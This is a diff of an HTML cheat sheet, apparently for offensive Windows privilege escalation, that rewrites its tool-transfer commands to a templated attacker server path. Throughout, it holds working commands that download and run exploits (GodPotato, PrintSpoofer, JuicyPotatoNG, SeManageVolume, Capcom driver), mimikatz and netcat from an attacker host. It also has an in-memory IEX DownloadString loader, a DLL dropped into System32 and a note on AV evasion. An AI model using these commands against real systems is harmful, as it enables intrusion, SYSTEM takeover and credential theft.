@@ -847,7 +847,7 @@ whoami /priv</div>
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Transfer FullPowers</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/FullPowers.exe -o {{WPATH}}\FullPowers.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -o {{WPATH}}\FullPowers.exe</div>
             </div>
           </div>
           <div class="step">
@@ -928,11 +928,11 @@ REM .NET 4.x -&gt; GodPotato-NET4.exe (try first) | .NET 3.5 -&gt; NET35 | .NET 
             <div class="step-content">
               <div class="step-title">Transfer GodPotato &mdash; select correct .NET variant</div>
               <div class="code-block purple">REM NET4 -- try this first:
-iwr http://{{KALI_IP}}/GodPotato-NET4.exe -o {{WPATH}}\gp.exe
+iwr http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET4.exe -o {{WPATH}}\gp.exe
 REM NET35 fallback:
-iwr http://{{KALI_IP}}/GodPotato-NET35.exe -o {{WPATH}}\gp.exe
+iwr http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET35.exe -o {{WPATH}}\gp.exe
 REM NET2 for very old targets:
-iwr http://{{KALI_IP}}/GodPotato-NET2.exe -o {{WPATH}}\gp.exe</div>
+iwr http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET2.exe -o {{WPATH}}\gp.exe</div>
             </div>
           </div>
           <div class="step">
@@ -978,7 +978,7 @@ REM Must show STATE: RUNNING -- if STOPPED, use GodPotato or SigmaPotato instead
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Transfer PrintSpoofer</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/PrintSpoofer64.exe -o {{WPATH}}\ps.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/PrintSpoofer64.exe -o {{WPATH}}\ps.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1012,7 +1012,7 @@ REM Non-interactive reverse shell:
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Transfer JuicyPotatoNG</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/JuicyPotatoNG.exe -o {{WPATH}}\jp.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/JuicyPotatoNG.exe -o {{WPATH}}\jp.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1047,9 +1047,9 @@ REM Bruteforce CLSIDs if default fails:
             <div class="step-content">
               <div class="step-title">Transfer SigmaPotato</div>
               <div class="code-block purple">REM Standard .NET4 build (Win8/Server 2012 to Win11/Server 2022):
-iwr http://{{KALI_IP}}/SigmaPotato.exe -o {{WPATH}}\sigma.exe
+iwr http://{{KALI_IP}}:{{PORT}}/windows/SigmaPotato.exe -o {{WPATH}}\sigma.exe
 REM Core build (needs .NET Framework 3.5; supports PS Core reflection):
-iwr http://{{KALI_IP}}/SigmaPotatoCore.exe -o {{WPATH}}\sigma.exe</div>
+iwr http://{{KALI_IP}}:{{PORT}}/windows/SigmaPotatoCore.exe -o {{WPATH}}\sigma.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1090,7 +1090,7 @@ REM Built-in reverse shell:
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Transfer SweetPotato</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/SweetPotato.exe -o {{WPATH}}\sweet.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/SweetPotato.exe -o {{WPATH}}\sweet.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1129,7 +1129,7 @@ REM PrintSpoofer mode (default; Spooler required):
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Transfer SharpEfsPotato</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/SharpEfsPotato.exe -o {{WPATH}}\sefsp.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/SharpEfsPotato.exe -o {{WPATH}}\sefsp.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1177,7 +1177,7 @@ REM PrintSpoofer mode (default; Spooler required):
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Transfer RoguePotato to target</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/RoguePotato.exe -o {{WPATH}}\rogue.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/RoguePotato.exe -o {{WPATH}}\rogue.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1212,8 +1212,8 @@ REM Randomize pipe name (stealth):
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Transfer churrasco (certutil &mdash; no PowerShell on XP/2003)</div>
-              <div class="code-block purple">certutil -urlcache -f http://{{KALI_IP}}/churrasco.exe {{WPATH}}\churrasco.exe
-certutil -urlcache -f http://{{KALI_IP}}/nc.exe {{WPATH}}\nc.exe</div>
+              <div class="code-block purple">certutil -urlcache -f http://{{KALI_IP}}:{{PORT}}/windows/churrasco.exe {{WPATH}}\churrasco.exe
+certutil -urlcache -f http://{{KALI_IP}}:{{PORT}}/windows/nc.exe {{WPATH}}\nc.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1315,7 +1315,7 @@ REM -i source file | -o destination (no drive letter, relative to C:\)</div>
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Transfer SeManageVolumeExploit.exe from attacker</div>
-              <div class="code-block">iwr http://{{KALI_IP}}/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe</div>
+              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/windows/SeManageVolumeExploit.exe -o {{WPATH}}\SeManageVolumeExploit.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1346,7 +1346,7 @@ REM -i source file | -o destination (no drive letter, relative to C:\)</div>
             <div class="step-num">6</div>
             <div class="step-content">
               <div class="step-title">Drop the DLL to exact PrintNotify path (now writable after step 3)</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
             </div>
           </div>
           <div class="step">
@@ -1410,7 +1410,7 @@ $object = [Activator]::CreateInstance($type)
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Download procdump to target</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/procdump.exe -o C:\Temp\procdump.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/procdump64.exe -o C:\Temp\procdump64.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1477,7 +1477,7 @@ mimikatz # sekurlsa::logonpasswords</div>
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Upload mimikatz to target (use obfuscated/custom build for AV evasion)</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/mimikatz.exe -o C:\Temp\m.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe -o C:\Temp\m.exe</div>
             </div>
           </div>
           <div class="step">
@@ -1511,7 +1511,7 @@ mimikatz # sekurlsa::logonpasswords full</div>
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Load psgetsys.ps1 in-memory (decoder-it / splinter_code)</div>
-              <div class="code-block purple">IEX (New-Object Net.WebClient).DownloadString('http://{{KALI_IP}}/psgetsys.ps1')</div>
+              <div class="code-block purple">IEX (New-Object Net.WebClient).DownloadString('http://{{KALI_IP}}:{{PORT}}/scripts/psgetsys.ps1')</div>
             </div>
           </div>
           <div class="step">
@@ -2064,8 +2064,9 @@ reg save HKLM\SYSTEM C:\Temp\system
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Download tools to target</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/eoploaddriver_x64.exe -o C:\Temp\eoploaddriver_x64.exe
-iwr http://{{KALI_IP}}/szkg64.sys -o C:\Temp\szkg64.sys</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/eoploaddriver_x64.exe -o C:\Temp\eoploaddriver_x64.exe
+# szkg64.sys: obtain from Exploit-DB entry 45401 and place in ~/privesc-toolkit/windows/
+iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64.sys -o C:\Temp\szkg64.sys</div>
             </div>
           </div>
           <div class="step">
@@ -2203,7 +2204,7 @@ iwr http://{{KALI_IP}}/szkg64.sys -o C:\Temp\szkg64.sys</div>
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Download TcbElevation.exe (pre-compiled binary available at b4lisong repo)</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/TcbElevation.exe -o C:\Temp\TcbElevation.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/TcbElevation.exe -o C:\Temp\TcbElevation.exe</div>
             </div>
           </div>
           <div class="step">
@@ -2292,8 +2293,10 @@ iwr http://{{KALI_IP}}/szkg64.sys -o C:\Temp\szkg64.sys</div>
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Download / compile SeCreateTokenPrivilegePoC from PrivFu</div>
-              <div class="code-block purple">iwr http://{{KALI_IP}}/SeCreateTokenPrivilegePoC.exe -o C:\Temp\SeCreateTokenPrivilegePoC.exe
-# Source: github.com/daem0nc0re/PrivFu → PrivilegedOperations/SeCreateTokenPrivilegePoC/</div>
+              <div class="code-block purple"># No public precompiled binary — must compile from source:
+# git clone https://github.com/daem0nc0re/PrivFu → open PrivilegedOperations/SeCreateTokenPrivilegePoC.sln → Build Release x64
+# Then serve and transfer:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/SeCreateTokenPrivilegePoC.exe -o C:\Temp\SeCreateTokenPrivilegePoC.exe</div>
             </div>
           </div>
           <div class="step">
@@ -2888,7 +2891,7 @@ sc qc AppMgmt   # Verify: SERVICE_START_NAME = LocalSystem</div>
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Transfer nc64.exe to target</div>
-              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/nc64.exe -OutFile C:\Temp\nc64.exe</div>
+              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -OutFile C:\Temp\nc64.exe</div>
             </div>
           </div>
           <div class="step">
@@ -2968,9 +2971,9 @@ whoami /priv | findstr /i "SeLoadDriver\|SeShutdown"
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Transfer tools to target</div>
-              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/eoploaddriver_x64.exe -OutFile C:\Temp\eoploaddriver_x64.exe
-iwr http://{{KALI_IP}}:{{PORT}}/Capcom.sys -OutFile C:\Temp\Capcom.sys
-iwr http://{{KALI_IP}}:{{PORT}}/ExploitCapcom.exe -OutFile C:\Temp\ExploitCapcom.exe</div>
+              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/windows/eoploaddriver_x64.exe -OutFile C:\Temp\eoploaddriver_x64.exe
+iwr http://{{KALI_IP}}:{{PORT}}/windows/Capcom.sys -OutFile C:\Temp\Capcom.sys
+iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile C:\Temp\ExploitCapcom.exe</div>
             </div>
           </div>
           <div class="step">
